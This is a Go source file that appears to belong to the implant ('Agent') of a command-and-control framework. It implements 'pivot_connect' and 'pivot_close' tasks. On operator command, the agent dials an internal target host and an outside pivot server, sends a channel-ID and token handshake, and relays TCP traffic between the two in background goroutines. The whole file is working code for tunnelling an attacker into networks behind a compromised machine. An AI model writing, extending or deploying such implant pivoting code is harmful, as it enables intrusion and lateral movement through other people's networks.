package core

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
)

type pivotChannel struct {
	target net.Conn
	pivot  net.Conn
}

var (
	pivotMu       sync.Mutex
	pivotChannels = map[uint32]*pivotChannel{}
)

func (a *Agent) pivotConnectVerb(ctx context.Context, t Task) Result {
	if len(t.Args) < 6 {
		return Result{ID: t.ID,
			Error: "pivot_connect requires " +
				"<server> <port> <channel_id> <token> <rhost> <rport>"}
	}
	server := t.Args[0]
	port := t.Args[1]
	channelID, err := strconv.ParseUint(t.Args[2], 10, 32)
	if err != nil {
		return Result{ID: t.ID, Error: "invalid channel_id"}
	}

	rawToken, err := hex.DecodeString(t.Args[3])
	if err != nil {
		return Result{ID: t.ID,
			Error: "token is not valid hex: " + err.Error()}
	}
	if len(rawToken) != 32 {
		return Result{ID: t.ID, Error: "token must be 32 bytes"}
	}
	rhost := t.Args[4]
	rport := t.Args[5]

	dialer := &net.Dialer{Timeout: 10 * time.Second}

	dialCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()

	target, err := dialer.DialContext(
		dialCtx, "tcp", net.JoinHostPort(rhost, rport))
	if err != nil {
		return Result{ID: t.ID, Error: "target dial: " + err.Error()}
	}

	pivotAddr := net.JoinHostPort(server, port)
	pivotConn, err := dialer.DialContext(dialCtx, "tcp", pivotAddr)
	if err != nil {
		target.Close()
		return Result{ID: t.ID, Error: "pivot dial: " + err.Error()}
	}

	// Send the 36-byte handshake: 4-byte channel ID + 32-byte token.
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(channelID))
	if _, err := pivotConn.Write(append(header, rawToken...)); err != nil {
		target.Close()
		pivotConn.Close()
		return Result{ID: t.ID,
			Error: "pivot handshake: " + err.Error()}
	}

	// Store the channel and relay in the background.
	ch := &pivotChannel{target: target, pivot: pivotConn}
	pivotMu.Lock()
	pivotChannels[uint32(channelID)] = ch
	pivotMu.Unlock()

	go relayPivot(uint32(channelID), ch)

	return Result{ID: t.ID,
		Output: encodeOutput([]byte("pivot established\n"))}
}

func (a *Agent) pivotCloseVerb(t Task) Result {
	if len(t.Args) < 1 {
		return Result{ID: t.ID,
			Error: "pivot_close requires <channel_id>"}
	}
	channelID, err := strconv.ParseUint(t.Args[0], 10, 32)
	if err != nil {
		return Result{ID: t.ID, Error: "invalid channel_id"}
	}
	pivotMu.Lock()
	ch := pivotChannels[uint32(channelID)]
	delete(pivotChannels, uint32(channelID))
	pivotMu.Unlock()

	if ch != nil {
		ch.target.Close()
		ch.pivot.Close()
	}
	return Result{ID: t.ID,
		Output: encodeOutput([]byte("closed\n"))}
}

func relayPivot(channelID uint32, ch *pivotChannel) {
	defer func() {
		pivotMu.Lock()
		delete(pivotChannels, channelID)
		pivotMu.Unlock()
		ch.target.Close()
		ch.pivot.Close()
	}()

	done := make(chan struct{}, 2)
	go func() {
		io.Copy(ch.pivot, ch.target)
		done <- struct{}{}
	}()
	go func() {
		io.Copy(ch.target, ch.pivot)
		done <- struct{}{}
	}()
	<-done
}

func pivotCloseAll() {
	pivotMu.Lock()
	channels := make([]*pivotChannel, 0, len(pivotChannels))
	for _, ch := range pivotChannels {
		channels = append(channels, ch)
	}
	pivotChannels = map[uint32]*pivotChannel{}
	pivotMu.Unlock()

	for _, ch := range channels {
		ch.target.Close()
		ch.pivot.Close()
	}
}